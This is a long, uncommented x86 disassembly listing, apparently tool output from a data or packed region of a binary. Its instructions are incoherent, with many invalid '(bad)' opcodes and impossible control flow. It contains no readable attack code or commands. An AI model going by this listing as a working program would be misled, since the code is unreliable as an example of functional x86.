  41bf83:	jb     0x41bffc
  41bf85:	jle    0x41bfa9
  41bf87:	mov    WORD PTR [esi-0x20],ss
  41bf8a:	push   esp
  41bf8b:	stos   DWORD PTR es:[edi],eax
  41bf8c:	and    DWORD PTR [edx],ecx
  41bf8e:	push   ebx
  41bf8f:	aad    0x96
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	dec    eax
  41c001:	out    0x4b,al
  41c003:	aas    
  41c004:	mov    ch,BYTE PTR [ecx]
  41c006:	add    DWORD PTR [eax],eax
  41c008:	add    eax,0xbe000001
  41c00d:	idiv   BYTE PTR [ecx]
  41c00f:	or     eax,0x5be3aef
  41c014:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c016:	fldcw  WORD PTR [edi+0x1fb19f24]
  41c01c:	sub    eax,0xa1da7f11
  41c021:	fs in  al,0x8
  41c024:	cmp    ch,BYTE PTR [edx]
  41c026:	or     esi,ebx
  41c028:	pop    esi
  41c029:	sar    DWORD PTR ds:0xe0e70e28,cl
  41c02f:	imul   ebx,DWORD PTR cs:[esi],0x1b7ab8f3
  41c036:	mov    edx,0x19a884ca
  41c03b:	std    
  41c03c:	retf   
  41c03d:	mov    al,0xe5
  41c03f:	push   eax
  41c040:	push   cs
  41c041:	out    dx,al
  41c042:	test   al,0xd
  41c044:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c045:	lahf   
  41c046:	outs   dx,DWORD PTR ds:[esi]
  41c047:	scas   eax,DWORD PTR es:[edi]
  41c048:	sub    al,0x8c
  41c04a:	test   DWORD PTR [ebx],0x8f8e071c
  41c050:	pop    edx
  41c051:	jl     0x41c0b5
  41c053:	int3   
  41c054:	retf   
  41c055:	push   eax
  41c056:	dec    ecx
  41c057:	mov    eax,ds:0xe6e4caf8
  41c05c:	dec    esi
  41c05d:	sbb    eax,0x79207935
  41c062:	and    ecx,DWORD PTR [edi-0x5e068a40]
  41c068:	or     BYTE PTR [esi+0x2c],ch
  41c06b:	adc    al,0x3
  41c06d:	ja     0x41c082
  41c06f:	sbb    BYTE PTR [ebx+0x1f],dl
  41c072:	or     DWORD PTR [ebp+0xb],ebx
  41c075:	mov    cl,0xab
  41c077:	das    
  41c078:	in     eax,0x49
  41c07a:	sahf   
  41c07b:	fisubr DWORD PTR [eax]
  41c07d:	dec    ebx
  41c07e:	sub    esi,edi
  41c080:	mov    edi,0x5fdec70d
  41c085:	mov    ebx,0x33129004
  41c08a:	fst    DWORD PTR [esi-0x59664f67]
  41c090:	jp     0x41c059
  41c092:	cmp    al,0xc1
  41c094:	in     al,0x1c
  41c096:	dec    edx
  41c097:	cdq    
  41c098:	inc    ebp
  41c099:	ja     0x41c0e6
  41c09b:	and    eax,0x6ccb6e0d
  41c0a0:	(bad)  [eax-0x20]
  41c0a3:	inc    edx
  41c0a4:	xlat   BYTE PTR ds:[ebx]
  41c0a5:	lahf   
  41c0a6:	scas   al,BYTE PTR es:[edi]
  41c0a7:	adc    al,0xe6
  41c0a9:	add    eax,DWORD PTR [edx]
  41c0ab:	aaa    
  41c0ac:	pop    ebx
  41c0ad:	(bad)  
  41c0ae:	jecxz  0x41c100
  41c0b0:	or     ecx,DWORD PTR [eax+eiz*8+0x1b]
  41c0b4:	add    eax,0x910acb31
  41c0b9:	cmc    
  41c0ba:	ins    DWORD PTR es:[edi],dx
  41c0bb:	test   al,0x18
  41c0bd:	cwde   
  41c0be:	xor    edx,DWORD PTR [esi-0x22]
  41c0c1:	mov    bh,0xa7
  41c0c3:	sar    BYTE PTR [edx],cl
  41c0c5:	dec    ebx
  41c0c6:	aad    0x22
  41c0c8:	popf   
  41c0c9:	out    dx,eax
  41c0ca:	pop    edi
  41c0cb:	(bad)  
  41c0cc:	jg     0x41c0fa
  41c0ce:	push   esi
  41c0cf:	xor    al,0x75
  41c0d1:	mov    esp,0xc196e81d
  41c0d6:	pop    edx
  41c0d7:	aaa    
  41c0d8:	lock or bh,BYTE PTR [ebx-0x26]
  41c0dc:	out    dx,eax
  41c0dd:	retf   
  41c0de:	pop    esi
  41c0df:	xor    eax,DWORD PTR [esi-0xd5de047]
  41c0e5:	inc    edi
  41c0e6:	sbb    DWORD PTR [edi+ecx*8+0x4417fa15],ebx
  41c0ed:	and    bl,bh
  41c0ef:	cmp    eax,0xdcf80987
  41c0f4:	xchg   esp,eax
  41c0f5:	jnp    0x41c163
  41c0f7:	test   al,0x4e
  41c0f9:	dec    edi
  41c0fa:	fldenv [edi+esi*2]
  41c0fd:	mov    dh,0x62
  41c0ff:	imul   esi,DWORD PTR [edx],0xffffffdd
  41c102:	cmp    BYTE PTR [edx-0x3255bfcd],ah
  41c108:	xor    cl,BYTE PTR [esi+eiz*8]
  41c10b:	add    BYTE PTR [edx+0xff9b355],cl
	...
  41c171:	add    BYTE PTR [eax],al
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x92e90501,0x4c
  41c182:	lods   al,BYTE PTR ds:[esi]
  41c183:	add    al,0x8f
  41c185:	sub    al,BYTE PTR [ecx]
  41c187:	add    BYTE PTR ds:0xb6000001,al
  41c18d:	daa    
  41c18e:	leave  
  41c18f:	jo     0x41c12d
  41c191:	imul   ebx,DWORD PTR [ebp+0x51],0xffffffec
  41c195:	push   esi
  41c196:	icebp  
  41c197:	popf   
  41c198:	call   0xc7d8:0x33f2b936
  41c19f:	cwde   
  41c1a0:	cwde   
  41c1a1:	loopne 0x41c212
  41c1a3:	inc    esp
  41c1a4:	pop    ebp
  41c1a5:	daa    
  41c1a6:	push   cs
  41c1a7:	xor    dh,BYTE PTR [esi+0x38f4be31]
  41c1ad:	imul   edx,DWORD PTR [ebx+0xdd5cc66],0xb05e3f23
  41c1b7:	mov    cl,0x55
  41c1b9:	lea    esi,ds:0x5ad406e6
  41c1bf:	test   BYTE PTR [edx-0x792e76ce],dl
  41c1c5:	push   edi
  41c1c6:	xor    cl,BYTE PTR [edx]
  41c1c8:	dec    edi
  41c1c9:	add    al,0x1d
  41c1cb:	push   ss
  41c1cc:	fmul   QWORD PTR [edi+ebp*1+0x76]
  41c1d0:	pop    ds
  41c1d1:	scas   eax,DWORD PTR es:[edi]
  41c1d2:	leave  
  41c1d3:	pop    ecx
  41c1d4:	mov    ds:0xcbbc72bb,al
  41c1d9:	sub    cl,BYTE PTR [ebx-0x4cc00656]
  41c1df:	xchg   BYTE PTR [edi-0x353730a7],al
  41c1e5:	sahf   
  41c1e6:	xor    DWORD PTR [edx+0x19],eax
  41c1e9:	jl     0x41c177
  41c1eb:	add    ebp,DWORD PTR ds:[edi-0x68444263]
  41c1f2:	es dec eax
  41c1f4:	sbb    al,0x38
  41c1f6:	retf   0xc260
  41c1f9:	inc    ebp
  41c1fa:	sub    BYTE PTR [ebx],0x25
  41c1fd:	cmp    bl,BYTE PTR [ecx]
  41c1ff:	xor    ah,BYTE PTR [ebx]
  41c201:	or     eax,0x3d569217
  41c206:	xchg   esp,eax
  41c207:	mov    ebx,0x7e9b6539
  41c20c:	retf   0xd440
  41c20f:	xchg   edi,eax
  41c210:	dec    ebx
  41c211:	fwait
  41c212:	jb     0x41c254
  41c214:	xor    BYTE PTR [edx+edx*4-0x3b],ah
  41c218:	int    0xcf
  41c21a:	add    ah,al
  41c21c:	xor    al,0x41
  41c21e:	das    
  41c21f:	dec    edi
  41c220:	cdq    
  41c221:	adc    DWORD PTR [edx+esi*2+0x7d0ebd76],ebp
  41c228:	shl    DWORD PTR [esp],cl
  41c22b:	fcomp  DWORD PTR [esi+0x3502e6e8]
  41c231:	sbb    eax,0x274e8c5e
  41c236:	call   0xa5f40460
  41c23b:	fucomi st,st(4)
  41c23d:	dec    ecx
  41c23e:	xchg   edi,eax
  41c23f:	dec    ebp
  41c240:	loopne 0x41c270
  41c242:	stos   BYTE PTR es:[edi],al
  41c243:	es jl  0x41c1eb
  41c246:	fisubr WORD PTR [edi]
  41c248:	outs   dx,DWORD PTR ds:[esi]
  41c249:	pop    ds
  41c24a:	sub    bh,BYTE PTR [eax+0x108057bb]
  41c250:	fdivr  DWORD PTR [esp+ebp*8+0x71f44709]
  41c257:	pop    ds
  41c258:	test   DWORD PTR [ecx],ebx
  41c25a:	das    
  41c25b:	stc    
  41c25c:	jbe    0x41c23e
  41c25e:	icebp  
  41c25f:	inc    edi
  41c260:	sbb    eax,0x15e08c92
  41c265:	inc    ecx
  41c266:	xor    esi,ecx
  41c268:	test   DWORD PTR [eax],ebx
  41c26a:	shl    DWORD PTR [eax+ebx*8-0x5eaca64d],cl
  41c271:	daa    
  41c272:	les    esp,FWORD PTR [ecx]
  41c274:	or     eax,0xab1ccfc5
  41c279:	mov    ah,0x57
  41c27b:	(bad)  
  41c27c:	cmp    BYTE PTR [eax],cl
  41c27e:	das    
  41c27f:	into   
  41c280:	or     eax,0xac93aeda
  41c285:	rol    DWORD PTR [edx-0x37],0x59
  41c289:	das    
  41c28a:	mov    BYTE PTR [edi-0x1d9932e8],bl
  41c290:	popa   
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	stos   BYTE PTR es:[edi],al
  41c301:	xor    al,ch
  41c303:	mov    esi,0x12b94
  41c308:	add    eax,0x43000001
  41c30d:	add    eax,0x23a1d7eb
  41c312:	jns    0x41c312
  41c314:	or     DWORD PTR [ecx],ebx
  41c316:	imul   edx,DWORD PTR [edi],0xc222c4bc
  41c31c:	add    al,0xa8
  41c31e:	fidivr WORD PTR [edx+0x46]
  41c321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c322:	pop    edi
  41c323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c324:	in     eax,dx
  41c325:	(bad)  
  41c327:	in     al,0x5d
  41c329:	add    BYTE PTR [edx+0x62355de8],ch
  41c32f:	push   ss
  41c330:	mov    fs,WORD PTR [edi-0x24]
  41c333:	push   esi
  41c334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c335:	dec    ecx
  41c336:	mov    bh,0xb9
  41c338:	jns    0x41c345
  41c33a:	jle    0x41c343
  41c33c:	lods   al,BYTE PTR ds:[esi]
  41c33d:	in     al,0x9f
  41c33f:	scas   eax,DWORD PTR es:[edi]
  41c340:	in     eax,dx
  41c341:	mov    WORD PTR [ebp+0x427d39b0],gs
  41c347:	and    DWORD PTR [ecx+0x4f],ebp
  41c34a:	jbe    0x41c2d6
  41c34c:	push   eax
  41c34d:	pop    edi
  41c34e:	mov    al,ds:0xbd059221
  41c353:	push   cs
  41c354:	sub    BYTE PTR cs:0x46e0006,dh
  41c35b:	gs push ecx
  41c35d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c35e:	dec    esp
  41c35f:	pushf  
  41c360:	and    BYTE PTR [ecx],cl
  41c362:	into   
  41c363:	inc    esi
  41c364:	push   ds
  41c365:	push   0xffffffa5
  41c367:	(bad)  
  41c368:	ret    0xebbe
  41c36b:	les    esp,FWORD PTR [edx]
  41c36d:	cmc    
  41c36e:	je     0x41c3cb
  41c370:	lock or eax,0xf63dbcca
  41c376:	inc    edi
  41c377:	(bad)  
  41c378:	xor    eax,DWORD PTR [esi+ebp*8]
  41c37b:	test   eax,0x72cb2f0
  41c380:	test   BYTE PTR [ebx],bh
  41c382:	data16 jo 0x41c400
  41c385:	cdq    
  41c386:	lea    ecx,[esi-0x46]
  41c389:	ss jno 0x41c380
  41c38c:	xlat   BYTE PTR ds:[ebx]
  41c38d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c38e:	repnz pop ds
  41c390:	aas    
  41c391:	loopne 0x41c3fa
  41c393:	(bad)  
  41c394:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c395:	sbb    al,0xa6
  41c397:	cmp    BYTE PTR [edx-0x2d997d6d],0xe8
  41c39e:	dec    eax
  41c39f:	mov    edi,0x55528d65
  41c3a4:	shl    dl,1
  41c3a6:	pop    esp
  41c3a7:	dec    ecx
  41c3a8:	nop
  41c3a9:	lods   eax,DWORD PTR ds:[esi]
  41c3aa:	test   al,0xfe
  41c3ac:	or     bl,BYTE PTR [ebp+0x18]
  41c3af:	loopne 0x41c3da
  41c3b1:	mov    ah,0x77
  41c3b3:	inc    ebp
  41c3b4:	jle    0x41c375
  41c3b6:	mov    dl,0xdc
  41c3b8:	dec    ebp
  41c3b9:	sbb    eax,0xff2472d2
  41c3be:	inc    edx
  41c3bf:	lods   eax,DWORD PTR ds:[esi]
  41c3c0:	pop    edi
  41c3c1:	jp     0x41c361
  41c3c3:	xchg   edi,eax
  41c3c4:	inc    ecx
  41c3c5:	pop    edi
  41c3c6:	add    eax,0x423e3d4b
  41c3cb:	(bad)  
  41c3cd:	mov    ebx,0xd6e089c7
  41c3d2:	outs   dx,BYTE PTR ds:[esi]
  41c3d3:	jmp    FWORD PTR [eax+0x4c]
  41c3d6:	cli    
  41c3d7:	popa   
  41c3d8:	xchg   ecx,eax
  41c3d9:	xchg   esp,eax
  41c3da:	sub    dh,BYTE PTR [edx+ebx*4-0x3f]
  41c3de:	jbe    0x41c414
  41c3e0:	sar    BYTE PTR [ecx+ebx*2],0xac
  41c3e4:	aad    0xd8
  41c3e6:	cdq    
  41c3e7:	fld    DWORD PTR [esi]
  41c3e9:	lods   eax,DWORD PTR ds:[esi]
  41c3ea:	sbb    eax,0x55d562c9
  41c3ef:	leave  
  41c3f0:	jb     0x41c38d
  41c3f2:	jp     0x41c3d1
  41c3f4:	icebp  
  41c3f5:	in     eax,0x10
  41c3f7:	dec    ecx
  41c3f8:	cmp    al,0xd4
  41c3fa:	(bad)  
  41c3fb:	stc    
  41c3fc:	and    DWORD PTR [ecx+0x2a7f1aca],esp
  41c402:	dec    ebp
  41c403:	sub    ebx,DWORD PTR [edi+0x6d]
  41c406:	fs dec ebp
  41c408:	leave  
  41c409:	dec    ebx
  41c40a:	dec    edx
  41c40b:	repnz aad 0xcf
  41c40e:	sub    BYTE PTR [ecx],ch
  41c410:	mov    WORD PTR [eax],es
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	out    0x50,eax
  41c482:	push   edx
  41c483:	int    0x99
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0x73000001,al
  41c48d:	and    eax,ebp
  41c48f:	pop    ebp
  41c490:	cmp    al,0x8a
  41c492:	or     DWORD PTR ds:0xee6702c2,ebx
  41c498:	jno    0x41c432
  41c49a:	pop    esi
  41c49b:	inc    BYTE PTR ds:0x16306949
  41c4a1:	adc    al,0x9a
  41c4a3:	mov    dh,0x97
  41c4a5:	mov    cl,0x26
  41c4a7:	mov    ecx,0xe434561
  41c4ac:	xchg   edi,eax
  41c4ad:	push   es
  41c4ae:	dec    edx
  41c4af:	dec    ax
  41c4b1:	mov    ch,0x53
  41c4b3:	xor    al,0xb7
  41c4b5:	icebp  
  41c4b6:	mov    DWORD PTR [edx-0x614deb29],esp
  41c4bc:	out    dx,eax
  41c4bd:	mov    ds:0x787596ec,al
  41c4c2:	mov    ebp,0xa7f1c7b2
  41c4c7:	add    DWORD PTR [esi-0x41ca5eda],ecx
  41c4cd:	xchg   esi,eax
  41c4ce:	int3   
  41c4cf:	(bad)  
  41c4d0:	sbb    al,0x9
  41c4d2:	and    al,0x32
  41c4d4:	aad    0x55
  41c4d6:	(bad)  
  41c4d7:	js     0x41c518
  41c4d9:	cmp    al,0xd1
  41c4db:	mov    esp,0xe04ca32b
  41c4e0:	aad    0xd
  41c4e2:	inc    esp
  41c4e3:	push   ecx
  41c4e4:	mov    DWORD PTR [ebp-0x32],esi
  41c4e7:	mov    esi,0xa46d56c6
  41c4ec:	bound  esi,QWORD PTR [ecx-0x38]
  41c4ef:	cld    
  41c4f0:	cdq    
  41c4f1:	outs   dx,DWORD PTR ds:[esi]
  41c4f2:	aas    
  41c4f3:	mov    BYTE PTR [ebx-0x5a7d4fc1],0xce
  41c4fa:	fstp   DWORD PTR [edi]
  41c4fc:	xlat   BYTE PTR ds:[ebx]
  41c4fd:	popa   
  41c4fe:	pushf  
  41c4ff:	lods   al,BYTE PTR ds:[esi]
  41c500:	call   0xa25f0774
  41c505:	pushf  
  41c506:	out    dx,al
  41c507:	pop    esp
  41c508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c509:	in     al,0x9
  41c50b:	dec    eax
  41c50c:	or     DWORD PTR ds:0xc5b76371,esi
  41c512:	lea    ebx,gs:[ebx-0x46da468c]
  41c519:	jb     0x41c554
  41c51b:	xlat   BYTE PTR ds:[ebx]
  41c51c:	mov    al,0xfc
  41c51e:	pushf  
  41c51f:	inc    esi
  41c520:	test   al,0x47
  41c522:	aam    0x7e
  41c524:	sbb    eax,0xa23715ba
  41c529:	inc    eax
  41c52a:	fiadd  WORD PTR [edx]
  41c52c:	jecxz  0x41c562
  41c52e:	out    dx,al
  41c52f:	mov    ds:0xb0c30963,al
  41c534:	inc    edi
  41c535:	ret    
  41c536:	mov    al,ds:0xe6a613f3
  41c53b:	cmp    eax,0xa3cbe371
  41c540:	dec    ebp
  41c541:	dec    esp
  41c542:	and    al,0x4d
  41c544:	push   ecx
  41c545:	xor    al,0x27
  41c547:	ret    
  41c548:	xor    dl,BYTE PTR [esi+ebp*4-0x68]
  41c54c:	fwait
  41c54d:	pop    eax
  41c54e:	mov    WORD PTR [ebp-0xe693198],?
  41c554:	mov    esp,0x39dfaacd
  41c559:	rol    dh,1
  41c55b:	fisub  WORD PTR [edi]
  41c55d:	xchg   esi,eax
  41c55e:	fild   QWORD PTR [esi-0x51c2b85b]
  41c564:	mov    edx,0x4169bbcb
  41c569:	push   esp
  41c56a:	adc    BYTE PTR [esp+edi*4+0x5b],bh
  41c56e:	add    al,0xa4
  41c570:	mov    edx,0x908b4c65
  41c575:	adc    edi,edx
  41c577:	dec    ecx
  41c578:	mov    ebx,0xf624b2e2
  41c57d:	gs mov dh,0x8b
  41c580:	inc    ecx
  41c581:	dec    ebp
  41c582:	xchg   DWORD PTR [ecx],ecx
  41c584:	fsubr  DWORD PTR [edx+0x76ea6c88]
  41c58a:	sub    eax,DWORD PTR [ebp-0x60]
  41c58d:	and    edx,edx
  41c58f:	mov    al,ds:0x16
	...
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x8d024afb
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0xab000001
  41c60d:	ret    0x5302
  41c610:	inc    ebx
  41c611:	inc    esp
  41c612:	xchg   DWORD PTR [eax],eax
  41c614:	and    bl,dl
  41c616:	and    BYTE PTR [ebp+0x3e],dl
  41c619:	fadd   QWORD PTR [ecx]
  41c61b:	push   0x5ef5648f
  41c620:	adc    eax,0xde4c206c
  41c625:	stos   DWORD PTR es:[edi],eax
  41c626:	or     eax,0xac051ccc
  41c62b:	add    eax,0xac8c2264
  41c630:	cmp    esi,DWORD PTR [eax]
  41c632:	and    eax,DWORD PTR [edi-0x32]
  41c635:	or     esp,DWORD PTR [eax+0x6]
  41c638:	(bad)  
  41c639:	repz imul DWORD PTR [eax]
  41c63c:	imul   esi,DWORD PTR [edx+0x6d06da9f],0x9d331db5
  41c646:	pushf  
  41c647:	ss or  esp,0x4c
  41c64b:	add    eax,0x2d
  41c64e:	mov    eax,ds:0x9c4f501a
  41c653:	test   DWORD PTR [esi+0x19],edi
  41c656:	ins    DWORD PTR es:[edi],dx
  41c657:	xchg   esp,eax
  41c658:	mov    ebx,0x71a6fb39
  41c65d:	or     eax,DWORD PTR [esi]
  41c65f:	inc    eax
  41c660:	inc    eax
  41c661:	push   cs
  41c662:	retf   0x271d
  41c665:	xor    dl,ch
  41c667:	fwait
  41c668:	or     bh,BYTE PTR [edx+ebp*2+0x3238bb6d]
  41c66f:	pop    ecx
  41c670:	jno    0x41c623
  41c672:	pusha  
  41c673:	adc    BYTE PTR [edi-0x7a],0x54
  41c677:	aaa    
  41c678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c679:	sub    al,0xe8
  41c67b:	add    eax,DWORD PTR [esi-0x1d]
  41c67e:	xchg   esp,eax
  41c67f:	shl    al,cl
  41c681:	cli    
  41c682:	cld    
  41c683:	out    dx,al
  41c684:	ds loope 0x41c69b
  41c687:	or     BYTE PTR [ebx],0x81
  41c68a:	and    DWORD PTR [ebx-0x38],ebx
  41c68d:	sbb    ebx,edx
  41c68f:	adc    dh,BYTE PTR [edi-0x74]
  41c692:	in     al,0x6f
  41c694:	adc    eax,DWORD PTR [ebp-0x10]
  41c697:	lahf   
  41c698:	sbb    DWORD PTR [edi+eiz*1-0x4fa1de37],0xffffffc9
  41c6a0:	sub    ah,BYTE PTR [edx]
  41c6a2:	das    
  41c6a3:	popf   
  41c6a4:	and    BYTE PTR ds:0x6ef2a3b8,ah
  41c6aa:	push   es
  41c6ab:	push   0xe28f35e9
  41c6b0:	mov    dl,BYTE PTR [edx+eax*4+0x40854f18]
  41c6b7:	stc    
  41c6b8:	fadd   QWORD PTR [esi+0x21fbbdc2]
  41c6be:	jbe    0x41c72c
  41c6c0:	popa   
  41c6c1:	jo     0x41c6cb
  41c6c3:	(bad)  
  41c6c4:	les    eax,FWORD PTR [edx+0x73]
  41c6c7:	in     al,dx
  41c6c8:	jp     0x41c662
  41c6ca:	mov    ebx,0x67b01b83
  41c6cf:	jns    0x41c6d9
  41c6d1:	ret    
  41c6d2:	fistp  WORD PTR [esi+eax*8+0x38623a75]
  41c6d9:	js     0x41c73d
  41c6db:	adc    DWORD PTR [eax],edi
  41c6dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6de:	cmp    al,0x2b
  41c6e0:	pop    ss
  41c6e1:	ret    0xee
  41c6e4:	dec    ecx
  41c6e5:	aam    0xbc
  41c6e7:	push   eax
  41c6e8:	test   eax,0x9d6e3a64
  41c6ed:	inc    ecx
  41c6ee:	add    edx,ebx
  41c6f0:	xchg   edx,eax
  41c6f1:	das    
  41c6f2:	add    al,BYTE PTR [ecx+0x20df62cf]
  41c6f8:	adc    eax,DWORD PTR [ecx+0x1b]
  41c6fb:	popa   
  41c6fc:	sbb    edi,DWORD PTR [ebp-0x63ac8ea3]
  41c702:	mov    eax,DWORD PTR [edx-0x359b646c]
  41c708:	jne    0x41c6e5
  41c70a:	pop    ds
  41c70b:	cmp    bl,bh
  41c70d:	arpl   WORD PTR [ebx+0xf5ce],sp
	...
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	jecxz  0x41c797
  41c782:	loope  0x41c74c
  41c784:	mov    ds:0x500012e,eax
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    BYTE PTR [esi-0x3d4182a3],ch
  41c791:	add    BYTE PTR [ebp+ecx*8+0x3b],dh
  41c795:	push   cs
  41c796:	inc    ebp
  41c797:	popa   
  41c798:	mov    cs,WORD PTR [ebx]
  41c79a:	cmp    DWORD PTR [ecx+0x7be1038b],ecx
  41c7a0:	dec    ebp
  41c7a1:	mov    ah,0xf7
  41c7a3:	dec    edi
  41c7a4:	xchg   esp,eax
  41c7a5:	pop    esp
  41c7a6:	cmp    dh,BYTE PTR [esi-0x28af4bdc]
  41c7ac:	mov    eax,0x174d80ea
  41c7b1:	mov    edi,0x42dc7bbe
  41c7b6:	and    DWORD PTR [edi+0x7],ebx
  41c7b9:	jge    0x41c7b4
  41c7bb:	and    al,0xfd
  41c7bd:	loopne 0x41c7d4
  41c7bf:	clc    
  41c7c0:	adc    esp,DWORD PTR [edi+0x610470fe]
  41c7c6:	cmp    ch,BYTE PTR [esp+ebp*8+0x77]
  41c7ca:	call   0xcc04:0x39d89508
  41c7d1:	jno    0x41c808
  41c7d3:	lods   al,BYTE PTR ds:[esi]
  41c7d4:	sbb    al,dl
  41c7d6:	cmp    esp,0x17f482e3
  41c7dc:	clc    
  41c7dd:	call   0x571a0628
  41c7e2:	(bad)  
  41c7e3:	scas   al,BYTE PTR es:[edi]
  41c7e4:	push   0xb2a2e11e
  41c7e9:	xchg   ebx,eax
  41c7ea:	jle    0x41c794
  41c7ec:	jnp    0x41c810
  41c7ee:	int    0x4b
  41c7f0:	icebp  
  41c7f1:	ss dec eax
  41c7f3:	cmp    al,0xaa
  41c7f5:	xchg   edx,eax
  41c7f6:	retf   0x1957
  41c7f9:	(bad)  
  41c7fa:	rcl    BYTE PTR [ebp+0x597a77b4],1
  41c800:	dec    eax
  41c801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c802:	cmp    BYTE PTR [edx-0x394b6828],ch
  41c808:	cwde   
  41c809:	jns    0x41c80e
  41c80b:	pusha  
  41c80c:	inc    eax
  41c80d:	cmp    al,0xad
  41c80f:	scas   eax,DWORD PTR es:[edi]
  41c810:	or     DWORD PTR [edx+0x5f1ed8d2],eax
  41c816:	(bad)  
  41c817:	mov    al,ds:0x43626566
  41c81c:	mov    ecx,0x5d08ef4f
  41c821:	scas   eax,DWORD PTR es:[edi]
  41c822:	cs inc ecx
  41c824:	into   
  41c825:	pop    esi
  41c826:	cmp    DWORD PTR [eax],esi
  41c828:	sub    dl,bl
  41c82a:	(bad)  
  41c82b:	out    dx,al
  41c82c:	bound  edi,QWORD PTR [eax+0x30]
  41c82f:	lds    esp,FWORD PTR [ecx+0x7348216f]
  41c835:	pop    ebp
  41c836:	cmp    eax,DWORD PTR [ebp+0x51]
  41c839:	(bad)  
  41c83a:	mov    ds,WORD PTR [esi]
  41c83c:	adc    cl,0xac
  41c83f:	ret    0x8bae
  41c842:	jb     0x41c8aa
  41c844:	inc    edi
  41c845:	arpl   WORD PTR [ecx],bx
  41c847:	jp     0x41c8bf
  41c849:	push   0xeb27d7d9
  41c84e:	sbb    eax,0x2eca6642
  41c853:	sub    ah,BYTE PTR [ebp-0x3241c0a7]
  41c859:	bswap  ebx
  41c85b:	dec    eax
  41c85c:	dec    eax
  41c85d:	aas    
  41c85e:	pop    ebx
  41c85f:	pop    esp
  41c860:	fsubr  QWORD PTR [esi+0x1c69e12c]
  41c866:	mov    al,ds:0xbef1ed82
  41c86b:	and    ebp,DWORD PTR [edx+edi*4-0x1f]
  41c86f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c870:	pop    ds
  41c871:	je     0x41c8b5
  41c873:	inc    edi
  41c874:	lahf   
  41c875:	(bad)  
  41c877:	fcom   st(1)
  41c879:	mov    al,0xc9
  41c87b:	jbe    0x41c854
  41c87d:	jns    0x41c8d1
  41c87f:	ins    DWORD PTR es:[edi],dx
  41c880:	imul   edi,DWORD PTR [ebx+edi*4],0x5b77dde9
  41c887:	in     eax,0x6
  41c889:	jns    0x41c8b3
  41c88b:	mov    esp,edi
  41c88d:	and    cl,bh
  41c88f:	shl    DWORD PTR [ebp+0x0],0x0
	...
  41c8f2:	add    BYTE PTR [eax],al
  41c8f4:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41c8fb:	ja     0x41c915
  41c8fd:	sub    DWORD PTR [ebx],edi
  41c8ff:	add    DWORD PTR [ebp+eiz*1-0x43],ecx
  41c903:	mov    DWORD PTR [eax+0x500012f],ebp
  41c909:	add    DWORD PTR [eax],eax
  41c90b:	add    BYTE PTR [edi-0x348d7e7],ch
  41c911:	test   BYTE PTR [ecx+0x7cadbfc1],0x99
  41c918:	jne    0x41c959
  41c91a:	repnz frstor [eax+0x1b140f5d]
  41c921:	or     ebx,0x61
  41c924:	scas   eax,DWORD PTR es:[edi]
  41c925:	in     al,0xd6
  41c927:	(bad)  
  41c929:	fild   DWORD PTR [edi]
  41c92b:	fsubr  DWORD PTR [esi+edx*8]
  41c92e:	fwait
  41c92f:	cli    
  41c930:	mov    dh,0x85
  41c932:	test   DWORD PTR [eax],ecx
  41c934:	lds    ebx,FWORD PTR [esi+0x34]
  41c937:	inc    eax
  41c938:	fidivr WORD PTR ds:0x1d37eab8
  41c93e:	push   0x34ff70b3
  41c943:	ret    0xf753
  41c946:	pop    edx
  41c947:	cld    
  41c948:	push   edx
  41c949:	jae    0x41c961
  41c94b:	jb     0x41c95f
  41c94d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c94e:	rcr    DWORD PTR [esi-0x6],1
  41c951:	dec    esi
  41c952:	test   edx,0x272ad604
  41c958:	ficom  WORD PTR [ecx]
  41c95a:	mov    bh,BYTE PTR [esi+0x4c881051]
  41c960:	aaa    
  41c961:	mov    ah,0xb5
  41c963:	sbb    DWORD PTR [esi+0xebc0bfe],0x8e9de9e1
  41c96d:	mov    edx,0x27e6d266
  41c972:	jmp    0x11cd6ff2
  41c977:	nop
  41c978:	in     al,dx
  41c979:	int    0x26
  41c97b:	xchg   esp,eax
  41c97c:	ds ss mov ah,0x12
